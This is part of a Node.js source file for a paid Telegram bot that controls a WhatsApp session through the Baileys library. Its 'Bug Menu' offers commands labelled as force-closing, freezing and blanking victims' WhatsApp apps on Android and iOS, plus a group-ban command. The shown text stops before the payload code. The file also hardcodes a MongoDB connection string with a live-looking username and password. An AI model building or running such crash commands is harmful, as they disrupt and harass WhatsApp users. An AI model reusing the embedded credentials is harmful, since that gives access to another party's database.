const { Telegraf, Markup, session } = require("telegraf");
const fs = require('fs');
const axios = require("axios");
const vm = require("vm");
const moment = require('moment-timezone');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReConnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisConnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    DisconnectReason,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
require('dotenv').config();
const BOT_TOKEN = process.env.BOT_TOKEN || "";
const MONGODB_URI = "mongodb+srv://ibnukhaedar09_db_user:I2B7YqRd4dwG0yMT@lekzoo.bieyoh4.mongodb.net/?appName=Lekzoo";
const DB_NAME = "Lekzo";
const TOKENS_COLLECTION = "Token";
const crypto = require('crypto');
const premiumFile = './𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂/premium.json';
const ownerFile = './𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂/owner.json';
const TOKENS_FILE = "./𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂/tokens.json";
let bots = [];

const { MongoClient } = require("mongodb");

const uri = MONGODB_URI;
const dbName = DB_NAME;
const collectionName = TOKENS_COLLECTION;

let mongoClient = null;
let tokensCollection = null;

async function connectMongoDB() {
    if (mongoClient) return tokensCollection;
    if (!uri) {
        console.error("❌ MONGODB_URI tidak ditemukan di .env");
        process.exit(1);
    }
    mongoClient = new MongoClient(uri);
    await mongoClient.connect();
    console.log("✅ Terhubung ke MongoDB");
    const db = mongoClient.db(dbName);
    tokensCollection = db.collection(collectionName);
    return tokensCollection;
}

async function fetchValidTokens() {
    try {
        const collection = await connectMongoDB();
        const docs = await collection.find({ isActive: true }).toArray();
        const tokens = docs.map(doc => doc.tokens).filter(Boolean).flat();
        console.log(`✅ ${tokens.length} token ditemukan di MongoDB`);
        return tokens;
    } catch (error) {
        console.error("❌ Gagal mengambil token dari MongoDB:", error.message);
        return [];
    }
}

// ============================================
// VALIDASI TOKEN
// ============================================
async function validateToken() {
    console.log(chalk.blue("🔍 Process Check Token..."));

    const tokenBot = BOT_TOKEN;
    const validTokens = await fetchValidTokens();

    if (!validTokens.includes(tokenBot)) {
        console.log(chalk.bold.red(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⢔⣒⠂⣀⣀⣤⣄⣀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣴⣿⠋⢠⣟⡼⣷⠼⣆⣼⢇⣿⣄⠱⣄
⠀⠀⠀⠀⠀⠀⠀⠹⣿⡀⣆⠙⠢⠐⠉⠉⣴⣾⣽⢟⡰⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣦⠀⠤⢴⣿⠿⢋⣴⡏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡙⠻⣿⣶⣦⣭⣉⠁⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠈⠉⠉⠉⠉⠇⡟⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⣘⣦⣀⠀⠀⣀⡴⠊⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⢻⣿⣿⣿⣿⠻⣧⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠫⣿⠉⠻⣇⠘⠓⠂⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢶⣾⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣧⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠙⠻⢿⣿⣿⠿⠛⣄⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣷⠂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀

❌ Token Is Not Registered
Please Contact @LekzoMarketV22 In Telegram For Registration Tokens
`));
        process.exit(1);
    }

    console.log(chalk.green(`
⠄⠄⠄⠄⠄⠄⠄⠄⣀⣠⣤⣤⣤⣄⡀⠄⠄⠄
⠄⠄⠄⠄⠄⠄⣴⣿⣿⣿⡿⣿⡿⣗⢌⢳⡀⠄
⠄⠄⠄⠄⠄⣼⣿⡇⣿⠹⡸⡹⣷⡹⡎⣧⢳⠄
⠄⠄⠄⠄⠄⣿⣿⠱⡙⠰⣢⡱⢹⡇⡷⢸⢸⠄
⠄⠄⠄⠄⠄⢿⢸⡈⣉⣤⠠⣴⡄⡇⠁⠄⢸⠄
⠄⠄⠄⠄⠄⠸⡆⡃⡙⢍⣹⡿⢓⠄⠤⣐⡟⠄
⠄⠄⠄⠄⠄⠄⠙⠾⠾⠮⣵⢸⡔⢷⣍⠉⠄⠄
⠄⠄⠄⠄⢀⣴⣾⣿⣷⡺⡋⢞⣎⣚⣛⣳⣴⣶
⠄⠄⠄⠄⢘⣛⣩⣾⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿
⠄⠄⣀⠺⣿⣿⣿⠟⣡⣾⠿⢿⣿⣿⡎⢋⠻⣿
⠄⠄⣉⣠⣿⣿⡏⣼⣿⠁⠶⠄⣿⣿⡇⡼⠄⠈
⠄⠄⣈⠻⠿⠟⢁⠘⢿⣷⣶⣾⣿⠟⡰⠃⠄⠄
⠄⣴⣿⣧⢻⣿⣿⣷⣦⣬⣉⣩⣴⠞⠁⠄⠄⠄
⠄⠘⠿⠿⢸⣿⣿⣿⣿⣿⣿⣿⠁⠄⠄⠄⠄⠄
⠄⢤⡝⣧⢸⣿⣿⣿⣿⣿⣿⠟⠄⠄⠄⠄⠄⠄
⣜⢧⠻⣀⢿⣿⣿⣿⣿⣿⠏⣾⣧⡀⠄⠄⠄⠄
⠹⢂⣾⣿⠸⣿⣿⣿⣿⡏⣼⣿⣿⣷⠄⠄⠄⠄
⠄⣿⣿⣿⣧⠹⣿⢻⡿⢰⣿⣿⣿⣿⣇⠄⠄⠄
⢸⣿⣿⣿⣿⣇⢹⢸⢁⣿⣿⣿⣿⣿⣿⡆⠄⠄
⢸⣿⣿⣿⣿⣿⣆⠄⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄
⠸⣿⣿⣿⣿⣿⣿⠄⢿⣿⣿⣿⣿⣿⣿⡇⠄⠄
⠄⣿⣿⣿⣿⣿⣿⠄⠈⣿⣿⣿⣿⣿⣿⡇⠄

  ✅ Token Valid
  👤 Developer: @LekzoMarketV22
  🙏 Thanks For Purchasing This Script
`));
}

const bot = new Telegraf(BOT_TOKEN);
bot.asepp = function (command, ...middlewares) {
  this.command(command, ...middlewares);
};
bot.use(session());

let Asep = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;
const OWNER_ID = "1663207738";
const requestMap = new Map();

const blacklist = [""];

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

const randomvidios = [
    "https://files.catbox.moe/06vgk5.mp4"
]; 

const menuEffects = [
  "5104841245755180586",
  "5107584321108051014",
  "5159385139981059251",
  "5046509860389126442"
];

const getRandomVidio = () => randomvidios[Math.floor(Math.random() * randomvidios.length)];

const getUpTime = () => {
  const uptimeSeconds = Math.floor(process.uptime());
  const days = Math.floor(uptimeSeconds / 86400);
  const hours = Math.floor((uptimeSeconds % 86400) / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = uptimeSeconds % 60;

  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

function escapeHtml(text) {
  if (typeof text !== "string") return text ?? "";
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
// ===================== FUNGSI TAMBAHAN UNTUK /groupban =====================
const getCurrentDate = () => {
  return new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
};

const getRandomImage = () => {
  const images = [
    "https://files.catbox.moe/06vgk5.mp4",
    "https://files.catbox.moe/8c7gz3.mp4"
  ];
  return images[Math.floor(Math.random() * images.length)];
};

const checkCooldown = (userId) => {
  return 0;
};

const isUserPremium = async (userId) => {
  try {
    const premData = require(premiumFile);
    const user = premData.find(u => u.userId === userId.toString());
    if (!user) return false;
    if (Date.now() > user.expires) return false;
    return true;
  } catch {
    return false;
  }
};

const isOwner = (userId) => {
  return userId.toString() === OWNER_ID;
};

//==================== KONEKSI WHATSAPP ===================
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P',
        }),
    };

    Asep = makeWASocket(connectionOptions);

    Asep.ev.on('creds.update', saveCreds);
    store.bind(Asep.ev);

    Asep.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.blue.bold(`
┏━━━━━━━»»——⍟——««━━━━━━━┓
┃  ${chalk.green.bold('WHATSAPP TERHUBUNG')}
┗━━━━━━━»»——⍟——««━━━━━━━┛`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.blue.bold(`
┏━━━━━━━»»——⍟——««━━━━━━━┓
┃ ${chalk.red.bold('WHATSAPP TERPUTUS')}
┗━━━━━━━»»——⍟——««━━━━━━━┛`),
                shouldReconnect ? chalk.blue.bold(`
┏━━━━━━━»»——⍟——««━━━━━━━┓
┃ ${chalk.red.bold('HUBUNGKAN ULANG')}
┗━━━━━━━»»——⍟——««━━━━━━━┛`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

let owner = loadJSON(ownerFile);
let premium = loadJSON(premiumFile);

const checkOwner = (ctx, next) => {
    if (ctx.from.id.toString() !== OWNER_ID && !owner.includes(ctx.from.id.toString())) {
        return ctx.reply(`<blockquote><tg-emoji emoji-id="5852477713482255786">⛔</tg-emoji> Akses Di Tolak! Anda bukan owner.</blockquote>`, {
        parse_mode: "HTML"
        });
    }
    next();
};

const checkPremium = (ctx, next) => {
    let premiumData = require(premiumFile);
    const userId = ctx.from.id.toString();
    const user = premiumData.find(u => u.userId === userId);

    if (!user) {
        return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Anda bukan pengguna premium.. Buy Premium Di @LekzoMarketV22 </blockquote>`, {
        parse_mode: "HTML"
        });
    }

    if (Date.now() > user.expires) {
        
        premiumData = premiumData.filter(u => u.userId !== userId);
        saveJSON(premiumFile, premiumData);
        return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Status premium Anda sudah habis.. Buy Premium Di @LekzoMarketV22 </blockquote>`, {
        parse_mode: "HTML"
        });
    }

    next();
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> WhatsApp belum terhubung. Silakan hubungi owner agar menghubungkan sender.</blockquote>`, {
        parse_mode: "HTML"
        });
    return;
  }
  next();
};

// ====== BUTTON DISCO ======
const styles = ["primary", "success", "danger"];
let styleIndex = 0;
let menuAnimation = null;

function getAnimatedKeyboard() {
    const style = styles[styleIndex];
    styleIndex++;
    if (styleIndex >= styles.length) styleIndex = 0;
    
    return {
        inline_keyboard: [
            [ 
                { text: "「 λ 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮 λ 」", callback_data: "owner_menu", style: style, icon_custom_emoji_id: "5190892569092976735" }, 
                { text: "「 λ 𝐅𝐮𝐧 𝐌𝐞𝐧𝐮 λ 」", callback_data: "group_menu", style: style, icon_custom_emoji_id: "5395471503603037530" }
            ],
            [   
                { text: "「 λ 𝐒𝐡𝐨𝐰 𝐁𝐮𝐠 λ 」", callback_data: "bug_menu", style: style, icon_custom_emoji_id: "5264742006306916414" },
                { text: "「 λ 𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨 λ 」", callback_data: "tqto_menu", style: style, icon_custom_emoji_id: "6097933166008341599" }
            ],
            [
                { text: "「 λ 𝐋𝐞𝐤𝐳𝐨𝐨 λ 」", url: "https://t.me/LekzoMarketV22", style: style, icon_custom_emoji_id: "6098241278372221298" }
            ]
        ]
    };
}
// ============================

bot.asepp("start", async (ctx) => {
  try {
    await ctx.telegram.setMessageReaction(
      ctx.chat.id,
      ctx.message.message_id,
      { reaction: [{ type: "emoji", emoji: "👾" }] }
    );
  } catch (e) {}
  await sendStartMenu(ctx);
});

const sendStartMenu = async (ctx) => {
  const vidio = getRandomVidio();
  const rawNama = ctx.from.first_name || ctx.from.username || "User";
  const nama = escapeHtml(rawNama);
  const RUNTIME = getUpTime();

  const caption = `<blockquote><b>━━─━━⧼ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 𝐁𝐨𝐭 ⧽━━─━━</b></blockquote>
<blockquote><strong> <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> λ 𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 λ<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji></strong></blockquote>
Owner : @LekzoMarketV22 <tg-emoji emoji-id="5361707636112778846">🤍</tg-emoji>
User : ${nama} <tg-emoji emoji-id="6289555446906751906">💋</tg-emoji>
Runtime : ${RUNTIME} <tg-emoji emoji-id="5382194935057372936">⏱</tg-emoji> 
Version    : 6.0 <tg-emoji emoji-id="6323535119323761554">☠</tg-emoji>
Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji>`;

  const menu = {
    caption,
    parse_mode: 'HTML',
    reply_markup: getAnimatedKeyboard()
  };

  if (ctx.chat?.type === "private") {
    menu.message_effect_id =
      menuEffects[Math.floor(Math.random() * menuEffects.length)];
  }

  try {
    const msg = await ctx.replyWithVideo(vidio, menu);

    if (menuAnimation) clearInterval(menuAnimation);
    menuAnimation = setInterval(async () => {
      try {
        await ctx.telegram.editMessageReplyMarkup(
          ctx.chat.id,
          msg.message_id,
          null,
          getAnimatedKeyboard()
        );
      } catch (e) {}
    }, 3000);

  } catch (err) {
    console.error("Gagal kirim start menu:", err.message);
    if (err.response?.description?.includes("message effects")) {
      delete menu.message_effect_id;
      const msg = await ctx.replyWithVideo(vidio, menu);
      if (menuAnimation) clearInterval(menuAnimation);
      menuAnimation = setInterval(async () => {
        try {
          await ctx.telegram.editMessageReplyMarkup(
            ctx.chat.id,
            msg.message_id,
            null,
            getAnimatedKeyboard()
          );
        } catch (e) {}
      }, 3000);
    } else {
      await ctx.reply(caption, { parse_mode: 'HTML', reply_markup: getAnimatedKeyboard() });
    }
  }
};

bot.on("callback_query", async (ctx) => {
  await ctx.answerCbQuery();

  const data = ctx.callbackQuery.data;
  const rawNama = ctx.from.first_name || ctx.from.username || "User";
  const nama = escapeHtml(rawNama);
  const RUNTIME = getUpTime(); 

  const update = async (ctx, teks, buttons = [], withVideo = false) => {
  try {
    await ctx.deleteMessage();
  } catch (e) {}

  const payload = {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: buttons }
  };

  if (ctx.chat?.type === "private") {
    payload.message_effect_id =
      menuEffects[Math.floor(Math.random() * menuEffects.length)];
  }

  try {
    if (withVideo) {
      const vidio = getRandomVidio();
      return await ctx.replyWithVideo(vidio, { caption: teks, ...payload });
    } else {
      return await ctx.reply(teks, payload);
    }
  } catch (err) {
    console.error("Error kirim menu (update):", err.message);
    if (err.response?.description?.includes("message effects")) {
      delete payload.message_effect_id;
      if (withVideo) {
        return await ctx.replyWithVideo(getRandomVidio(), { caption: teks, ...payload });
      } else {
        return await ctx.reply(teks, payload);
      }
    }
    if (withVideo) {
      return await ctx.reply(teks, payload);
    } else {
      return await ctx.reply("⚠️ Terjadi kesalahan, coba lagi nanti.");
    }
  }
};

  if (data === "owner_menu") {
    return update(ctx, `
<blockquote>─────⧼ λ 𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 λ ⧽─────</blockquote>
<blockquote><b>━━─━━⧼ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 𝐁𝐨𝐭 ⧽━━─━━</b></blockquote>
<blockquote><strong> <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> λ 𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 λ<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji></strong></blockquote>
Owner : @LekzoMarketV22 <tg-emoji emoji-id="5361707636112778846">🤍</tg-emoji>
User : ${nama} <tg-emoji emoji-id="6289555446906751906">💋</tg-emoji>
Runtime : ${RUNTIME} <tg-emoji emoji-id="5382194935057372936">⏱</tg-emoji> 
Version    : 6.0 <tg-emoji emoji-id="6323535119323761554">☠</tg-emoji>
Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji>
│─────⁅ 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮 ⁆──────▢
│─▢ /addowner ( day )
│─▢ /delowner ( day )
│─▢ /addprem ( day )
│─▢ /delprem ( day )
│─▢ /cekprem
│─▢ /pairingcode
│─▢ /ceksender
│─▢ /putussender
<blockquote>│─▢ Sellect To Button Back To Menu</blockquote>
`, [[{ text: "「 λ 𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮 λ 」", callback_data: "back_start", style: "danger", icon_custom_emoji_id: "5787546290527145353" }]], true);
  }

  if (data === "group_menu") {
    return update(ctx, `
<blockquote>─────⧼ λ 𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 λ ⧽─────</blockquote>
<blockquote><b>━━─━━⧼ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 𝐁𝐨𝐭 ⧽━━─━━</b></blockquote>
<blockquote><strong> <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> λ 𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 λ<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji></strong></blockquote>
Owner : @LekzoMarketV22 <tg-emoji emoji-id="5361707636112778846">🤍</tg-emoji>
User : ${nama} <tg-emoji emoji-id="6289555446906751906">💋</tg-emoji>
Runtime : ${RUNTIME} <tg-emoji emoji-id="5382194935057372936">⏱</tg-emoji> 
Version    : 6.0 <tg-emoji emoji-id="6323535119323761554">☠</tg-emoji>
Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji>
<blockquote>─────⧼ λ 𝐅𝐮𝐧 𝐌𝐞𝐧𝐮 λ ⧽─────</blockquote>
│─▢ /info
│─▢ /cekganteng
│─▢ /cekcantik
│─▢ /cekkontol
│─▢ /cekmemek
│─▢ /promote
│─▢ /demote
│─▢ /ban
│─▢ /mute
│─▢ /unmute
│─▢ /reqfitur
│─▢ /bokep
│─▢ /testfunction
`, [[{ text: "「 λ 𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮 λ 」", callback_data: "back_start", style: "danger", icon_custom_emoji_id: "5787546290527145353" }]], true);
  }

  if (data === "bug_menu") {
    return update(ctx, `
<blockquote>─────⧼ λ 𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 λ ⧽─────</blockquote>
<blockquote><b>━━─━━⧼ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 𝐁𝐨𝐭 ⧽━━─━━</b></blockquote>
<blockquote><strong> <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> λ 𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 λ<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji></strong></blockquote>
Owner : @LekzoMarketV22 <tg-emoji emoji-id="5361707636112778846">🤍</tg-emoji>
User : ${nama} <tg-emoji emoji-id="6289555446906751906">💋</tg-emoji>
Runtime : ${RUNTIME} <tg-emoji emoji-id="5382194935057372936">⏱</tg-emoji> 
Version    : 6.0 <tg-emoji emoji-id="6323535119323761554">☠</tg-emoji>
Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji>
│<b>─━━─━⧼ 𝐁𝐮𝐠 𝐌𝐞𝐧𝐮 ⧽─━─━━:</b>
│─▢ λ 𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 λ
│─▢ /XCrashVexorv 
│<b>╰➤ Forclose Stc </b>
│─▢ /InvisVexorv
│<b>╰➤ Delay Hard </b>
│─▢ /SuperVexorv 
│<b>╰➤ Forclose Invis </b>
│─▢ /BlankingVexorv 
│<b>╰➤ Blank Hard </b>
│─▢ /XIosLol 
│<b>╰➤ Forclose Ios </b>
│<b>─➤ Group Ban </b>
│─▢ /groupban
│<b>╰➤ Band Group </b>
`, [[{ text: "「 λ 𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮 λ 」", callback_data: "back_start", style: "danger", icon_custom_emoji_id: "5787546290527145353" }]], true);
  }

  if (data === "tqto_menu") {
    return update(ctx, `
<blockquote>─────⧼ λ 𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 λ ⧽─────</blockquote>
<blockquote><b>━━─━━⧼ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 𝐁𝐨𝐭 ⧽━━─━━</b></blockquote>
<blockquote><strong> <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> λ 𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 λ<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji></strong></blockquote>
Owner : @LekzoMarketV22 <tg-emoji emoji-id="5361707636112778846">🤍</tg-emoji>
User : ${nama} <tg-emoji emoji-id="6289555446906751906">💋</tg-emoji>
Runtime : ${RUNTIME} <tg-emoji emoji-id="5382194935057372936">⏱</tg-emoji> 
Version    : 6.0 <tg-emoji emoji-id="6323535119323761554">☠</tg-emoji>
Platform   : Telegram <tg-emoji emoji-id="5330237710655306682">📱</tg-emoji>
<blockquote>─────⧼ λ 𝐓𝐡𝐚𝐧𝐬𝐤 𝐓𝐨 λ ⧽─────</blockquote>
│─▢ Allah [ My God ]
│─▢ Lekzo [ Owner Sc <tg-emoji emoji-id="5390858914885568318">👑</tg-emoji> ]
│─▢ Farz [ My Partner ]`, [[{ text: "「 λ 𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮 λ 」", callback_data: "back_start", style: "danger", icon_custom_emoji_id: "5787546290527145353" }]], true);
  }

  if (data === "back_start") {
    try { await ctx.deleteMessage(); } catch (e) {}
    
    // Hentikan animasi lama
    if (menuAnimation) {
        clearInterval(menuAnimation);
        menuAnimation = null;
    }
    
    return sendStartMenu(ctx);
}
});
//=========================== 「 λ 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮 λ 」 ============================
bot.asepp('addowner', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 3) {
        return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Gunakan format: /addowner Id User hari\nContoh: /addprem 75189916 30</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    const userId = args[1];
    const days = parseInt(args[2]);
    if (isNaN(days) || days <= 0) {
        return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Masukkan jumlah hari yang valid.</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    let ownerData = require(ownerFile);
    const now = Date.now();
    const expiresAt = now + days * 24 * 60 * 60 * 1000;

    const existing = ownerData.find(u => u.userId === userId);
    if (existing) {

        existing.expires = expiresAt;
    } else {

        ownerData.push({ userId, expires: expiresAt });
    }

    saveJSON(ownerFile, ownerData);

    return ctx.reply(`<blockquote><tg-emoji emoji-id="5422636639174293981">🎉</tg-emoji> Pengguna ${userId} sekarang Owner selama ${days} hari!</blockquote>`, {
        parse_mode: "HTML"
        });
});

bot.asepp('delowner', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delowner 123456789</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    const userId = args[1];

    let ownerData = require(ownerFile);
    const exists = ownerData.find(u => u.userId === userId);
    if (!exists) {
        return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Pengguna ${userId} tidak ada dalam daftar Owner.</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    ownerData = ownerData.filter(u => u.userId !== userId);
    saveJSON(ownerFile, ownerData);

    return ctx.reply(`<blockquote><tg-emoji emoji-id="5323276092654520315">🎁</tg-emoji> Pengguna ${userId} telah dihapus dari daftar Owner.</blockquote>`, {
        parse_mode: "HTML"
        });
});

bot.asepp('addprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 3) {
        return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Gunakan format: /addprem Id User hari\nContoh: /addprem 75189916 30</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    const userId = args[1];
    const days = parseInt(args[2]);
    if (isNaN(days) || days <= 0) {
        return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Masukkan jumlah hari yang valid.</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    let premiumData = require(premiumFile);
    const now = Date.now();
